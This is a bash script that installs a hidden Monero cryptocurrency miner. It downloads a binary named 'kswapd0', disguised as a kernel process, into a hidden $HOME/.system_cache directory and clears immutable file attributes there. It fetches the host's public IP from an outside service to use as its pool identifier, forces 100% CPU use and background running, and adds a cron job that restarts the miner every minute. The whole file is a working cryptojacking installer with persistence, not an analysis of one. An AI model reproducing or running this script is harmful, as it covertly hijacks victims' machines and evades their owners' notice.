#!/bin/bash

chattr -i $HOME/.system_cache/*
chattr -i $HOME/.system_cache/

# Script to start Monero Ocean Miner and manage files

# Create directory for the files
mkdir -p "$HOME/.system_cache/"

# Paths to the required files
KSWAPD0="$HOME/.system_cache/kswapd0"
CONFIG_JSON="$HOME/.system_cache/config.json"

# Terminate processes related to the specific kswapd0
pkill -f "$KSWAPD0 --config=$CONFIG_JSON"

# Check if the files exist and download if not
if [ -f "$KSWAPD0" ] && [ -x "$KSWAPD0" ]; then
    echo "kswapd0 exists and is executable."
else
    echo "kswapd0 does not exist or is not executable. Downloading..."
    curl -L -o "$KSWAPD0" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kswapd0
    chmod +x "$KSWAPD0"
fi

if [ -f "$CONFIG_JSON" ]; then
    echo "config.json exists."
else
    echo "config.json does not exist. Downloading..."
    curl -L -o "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
fi

echo "PASS..."
#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
#PASS=`hostname`
#PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
PASS=`sh -c "(curl -4 ip.sb)"`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.system_cache/config.json


echo "sed"
#sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.system_cache/config.json
#sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.system_cache/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.system_cache/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.system_cache/config.json
#sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.system_cache/config.json
#sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.system_cache/config.json
sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.system_cache/config.json
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.system_cache/config.json
sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.system_cache/config.json
sed -i 's/"background": *false,/"background": true,/' $HOME/.system_cache/config.json


# Run kswapd0 if no other process with the specific configuration is running
if ! pgrep -f "$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config.json" > /dev/null; then
    echo "kswapd0 not started. Starting it..."
    "$HOME/.system_cache/kswapd0" --config="$HOME/.system_cache/config.json" &
else
    echo "kswapd0 is already running."
fi

# Create the check script
cat <<'EOF' >"$HOME/.system_cache/check_and_start.sh"
#!/bin/bash
lockfile="$HOME/.system_cache/check_and_start.lock"

# Locking-Mechanismus mit flock
exec 200>"$lockfile"
flock -n 200 || exit 1

if ! pgrep -f "$HOME/.system_cache/kswapd0"; then
  "$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config.json"
fi
EOF

# Make the check script executable
chmod +x "$HOME/.system_cache/check_and_start.sh"

# Nur einen Cronjob hinzufügen, falls nicht vorhanden
(crontab -l 2>/dev/null | grep -v "check_and_start.sh"; echo "* * * * * $HOME/.system_cache/check_and_start.sh") | crontab -



## Cron job setup: remove outdated lines and add the new command
#CRON_JOB="*/5 * * * * $HOME/.system_cache/check_and_start.sh"
#(crontab -l 2>/dev/null | grep -v -E '(out dat|check_and_start.sh)'; echo "$CRON_JOB") | crontab -
